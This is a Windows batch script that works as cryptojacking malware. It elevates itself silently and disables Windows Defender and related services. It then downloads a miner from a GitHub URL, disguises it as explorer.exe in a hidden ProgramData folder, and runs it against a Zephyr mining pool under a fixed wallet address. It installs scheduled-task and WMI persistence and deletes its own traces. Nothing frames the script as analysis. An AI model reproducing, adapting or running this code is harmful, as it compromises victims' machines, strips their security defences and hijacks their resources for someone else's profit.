@echo off
setlocal EnableDelayedExpansion

:: Silent Admin Elevation
fsutil dirty query %SystemDrive% >nul 2>&1 || (
    echo Creating elevation script...
    set "vbs=%temp%\elevate.vbs"
    echo Set UAC = CreateObject^("Shell.Application"^) > "!vbs!"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 0 >> "!vbs!"
    cscript //nologo "!vbs!" 
    del /f /q "!vbs!" >nul 2>&1
    exit /b
)

:: Initialize logging for troubleshooting (self-deleting)
set "log=%temp%\~setup.log"
echo [%date% %time%] Starting deployment >> "%log%"

:: Phase 1: Disable Security Systems
call :disable_security

:: Phase 2: Deploy Miner
call :deploy_miner

:: Phase 3: Install Persistence
call :install_persistence

:: Final Cleanup
echo [%date% %time%] Deployment successful >> "%log%"
timeout /t 3 >nul
del /f /q "%~f0" >nul 2>&1
del /f /q "%log%" >nul 2>&1
exit /b

:disable_security
echo [%date% %time%] Disabling security >> "%log%"

:: Stop and disable services
for %%s in (WinDefend SecurityHealthService wscsvc) do (
    sc stop %%s >nul 2>&1
    sc config %%s start= disabled >nul 2>&1
)

:: Registry tweaks
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SecurityHealthService" /v Start /t REG_DWORD /d 4 /f >nul 2>&1

:: PowerShell hardening
echo [%date% %time%] Applying PowerShell hardening >> "%log%"
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true -DisableScriptScanning $true -ErrorAction SilentlyContinue" >> "%log%" 2>&1

:: Terminate AV processes
taskkill /f /im MsMpEng.exe /im NisSrv.exe /im SecurityHealthHost.exe >nul 2>&1
exit /b

:deploy_miner
echo [%date% %time%] Downloading miner >> "%log%"
set "miner_url=https://github.com/L3m0NShare/studious-succotash/raw/refs/heads/main/explorer.exe"
set "miner_dir=%ProgramData%\Microsoft\Windows\System"
set "miner_path=%miner_dir%\explorer.exe"

:: Create hidden directory
if not exist "%miner_dir%" (
    mkdir "%miner_dir%" >nul 2>&1
    attrib +s +h "%miner_dir%" >nul 2>&1
)

:: Download with multiple fallback methods
set success=0

:: Method 1: PowerShell
powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadFile('%miner_url%', '%miner_path%')" >> "%log%" 2>&1
if exist "%miner_path%" set success=1

:: Method 2: Certutil if PowerShell fails
if %success% equ 0 (
    echo [%date% %time%] PowerShell failed, trying certutil >> "%log%"
    certutil -urlcache -split -f "%miner_url%" "%miner_path%" >> "%log%" 2>&1
    if exist "%miner_path%" set success=1
)

:: Method 3: Bitsadmin as last resort
if %success% equ 0 (
    echo [%date% %time%] Certutil failed, trying bitsadmin >> "%log%"
    bitsadmin /transfer getfile /download /priority foreground "%miner_url%" "%miner_path%" >> "%log%" 2>&1
    if exist "%miner_path%" set success=1
)

if not exist "%miner_path%" (
    echo [%date% %time%] Download failed! >> "%log%"
    exit /b
)

:: Configure file attributes
attrib +s +h "%miner_path%" >nul 2>&1
icacls "%miner_path%" /inheritance:r /grant:r *S-1-5-18:(F) /grant:r *S-1-5-32-544:(F) >> "%log%" 2>&1

:: Execute miner
echo [%date% %time%] Launching miner >> "%log%"
start "" /b cmd /c "cd /d "%miner_dir%" && explorer.exe -o zeph.2miners.com:2222 -u ZEPHYR3Q28tKAVVeYt7QziN2QLEuzr4Qzg6VmLuuJoZfh7yVKFmLz2h28vQSzSQdhpHRDWJBJ5gCXd51MELe6YKFba3RwYdNmZG1N.%USERNAME% -p x -k -B"
exit /b

:install_persistence
echo [%date% %time%] Installing persistence >> "%log%"
set "task_name=Windows System Health"
set "miner_path=%miner_dir%\explorer.exe"
set "watchdog_ps=%miner_dir%\~healthcheck.ps1"

:: Create watchdog script
(
echo function CheckMiner {
echo     $miner = "%miner_path%"
echo     $running = Get-Process | Where-Object { $_.Path -eq $miner } 
echo     if (-not $running) {
echo         Start-Process -FilePath "$miner" -ArgumentList '-o zeph.2miners.com:2222 -u ZEPHYR3Q28tKAVVeYt7QziN2QLEuzr4Qzg6VmLuuJoZfh7yVKFmLz2h28vQSzSQdhpHRDWJBJ5gCXd51MELe6YKFba3RwYdNmZG1N.%USERNAME% -p x -k -B' -WindowStyle Hidden
echo     }
echo }
echo while ($true) {
echo     CheckMiner
echo     Start-Sleep -Seconds 300
echo }
) > "%watchdog_ps%"

:: Hide watchdog
attrib +s +h "%watchdog_ps%" >nul 2>&1

:: Create scheduled task
schtasks /create /tn "%task_name%" /tr "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File \"%watchdog_ps%\"" /sc minute /mo 5 /ru SYSTEM /f >> "%log%" 2>&1

:: Alternative WMI persistence if task fails
if errorlevel 1 (
    echo [%date% %time%] Task creation failed, using WMI >> "%log%"
    set "wmi_script=%miner_dir%\~wmi_setup.ps1"
    (
    echo $filterArgs = @{
    echo     EventNamespace = 'root/cimv2'
    echo     Name = 'WindowsSystemHealthMonitor'
    echo     Query = "SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name='explorer.exe'"
    echo     QueryLanguage = 'WQL'
    echo }
    echo $filter = Set-WmiInstance -Class __EventFilter -Arguments $filterArgs
    echo
    echo $consumerArgs = @{
    echo     Name = 'WindowsSystemHealthAction'
    echo     CommandLineTemplate = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File \`"%watchdog_ps%\`""
    echo }
    echo $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Arguments $consumerArgs
    echo
    echo Set-WmiInstance -Class __FilterToConsumerBinding -Arguments @{Filter=$filter; Consumer=$consumer} >nul
    ) > "%wmi_script%"
    powershell -ExecutionPolicy Bypass -File "%wmi_script%" >> "%log%" 2>&1
    attrib +s +h "%wmi_script%" >nul 2>&1
)
exit /b